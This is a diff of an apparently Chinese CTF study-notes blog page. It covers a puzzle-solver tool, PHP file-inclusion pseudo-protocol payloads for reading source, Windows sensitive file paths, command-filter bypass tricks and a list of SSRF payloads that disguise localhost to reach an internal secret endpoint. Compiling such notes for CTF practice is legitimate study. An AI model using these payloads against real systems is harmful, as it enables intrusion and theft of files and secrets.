+<p>size比较重要，这里影响着图片数量，图片数量要和本来的图片数相等</p>
+<blockquote>
+<h1 id="Creating-puzzles-from-images"><a href="#Creating-puzzles-from-images" class="headerlink" title="Creating puzzles from images"></a>Creating puzzles from images</h1><p>To create puzzle from image use <code>gaps create</code></p>
+<pre><code>gaps create images/pillars.jpg puzzle.jpg --size=64
+</code></pre>
+<p>will create puzzle with 240 pieces from <code>images/pillars.jpg</code> where each piece is 64x64 pixels.</p>
+<p>Run <code>gaps create --help</code> for detailed help.</p>
+<p>注：根据给定的拼图大小，创建的拼图图像尺寸可能小于原始图像。从原始图像中裁剪出最大可能的矩形。</p>
+</blockquote>
+<blockquote>
+<h1 id="Solving-puzzles"><a href="#Solving-puzzles" class="headerlink" title="Solving puzzles"></a>Solving puzzles</h1><p>In order to solve puzzles, use <code>gaps run</code>:</p>
+<pre><code>gaps run puzzle.jpg solution.jpg --generations=20 --population=600
+</code></pre>
+<p>This will start genetic algorithm with initial population of 600 and 20 generations.</p>
+<p>Following options are provided:</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--size</code></td>
+<td>拼图大小（像素）</td>
+</tr>
+<tr>
+<td><code>--generations</code></td>
+<td>遗传算法的代数</td>
+</tr>
+<tr>
+<td><code>--population</code></td>
+<td>Number of individuals in population</td>
+</tr>
+<tr>
+<td><code>--debug</code></td>
+<td>Show the best solution after each generation</td>
+</tr>
+</tbody></table>
+<p>Run <code>gaps run --help</code> for detailed help.</p>
+</blockquote>
+<blockquote>
+<h2 id="Size-detection"><a href="#Size-detection" class="headerlink" title="Size detection"></a>Size detection</h2><p>If you don’t explicitly provide <code>--size</code> argument to <code>gaps run</code>, piece size will be detected automatically.</p>
+<p>However, you can always provide <code>gaps run</code> with <code>--size</code> argument explicitly:</p>
+<pre><code>gaps run puzzle.jpg solution.jpg --generations=20 --population=600 --size=48
+</code></pre>
+</blockquote>
+<h2 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h2><p>有时候不同压缩工具解压的结果有差异，需要都试试</p>
 <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="伪协议："><a href="#伪协议：" class="headerlink" title="伪协议："></a>伪协议：</h2><p>php:&#x2F;&#x2F;input伪协议以POST传参</p>
 <p>data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p>
 <p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</p>
 <p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>
+<pre><code>php://filter/convert.iconv.UTF-7.UCS-4*/resource=xxx.php
+</code></pre>
+<h2 id="iconv"><a href="#iconv" class="headerlink" title="iconv:"></a>iconv:</h2><pre><code>UCS-4*
+UCS-4BE
+UCS-4LE*
+UCS-2
+UCS-2BE
+UCS-2LE
+UTF-32*
+UTF-32BE*
+UTF-32LE*
+UTF-16*
+UTF-16BE*
+UTF-16LE*
+UTF-7
+UTF7-IMAP
+UTF-8*
+ASCII*
+</code></pre>
 <p><strong>windows常见的敏感文件路径:</strong></p>
 <pre><code class="cobol">C:\boot.ini //查看系统版本
 C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件
@@ -500,4 +637,17 @@ ca$&#123;21&#125;t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),$
 <p>tar.gz，zip，rar，tar</p>
 <p>常见的网站源码备份文件名：</p>
 <p>web，website，backup，back，www，wwwroot，temp</p>
-</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2023/11/07/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="原型链污染"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: 原型链污染</span></a><a class="button is-default" href="/2023/10/24/Windows-Privilege-Escalation/" title="Windows_Privilege_Escalation"><span class="has-text-weight-semibold">Next: Windows_Privilege_Escalation</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>127.0.0.1被禁止访问，则可以尝试各种变形</p>
+<pre><code>?url=http://@127.0.0.1:8000@/api/internal/secret
+?url=http://2130706433:8000/api/internal/secret
+?url=http://0x7f.0x0.0x0.0x1:8000/api/internal/secret
+?url=http://[::127.0.0.1]:8000/api/internal/secret
+?url=http://127。0。0。1:8000/api/internal/secret
+?url=http://127.1:8000/api/internal/secret
+?url=http://0.0.0.0:8000/api/internal/secret
+?url=http://127.127.127.127:8000/api/internal/secret
+</code></pre>
+<p>127.0.0.1&#x3D;0.0.0.0&#x3D;127.127.127.127</p>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="cyberchef"><a href="#cyberchef" class="headerlink" title="cyberchef:"></a>cyberchef:</h2><p>affine:仿射密码</p>
+<p>bacon：培根密码</p>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2023/11/07/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="原型链污染"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: 原型链污染</span></a><a class="button is-default" href="/2023/10/24/Windows-Privilege-Escalation/" title="Windows_Privilege_Escalation"><span class="has-text-weight-semibold">Next: Windows_Privilege_Escalation</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
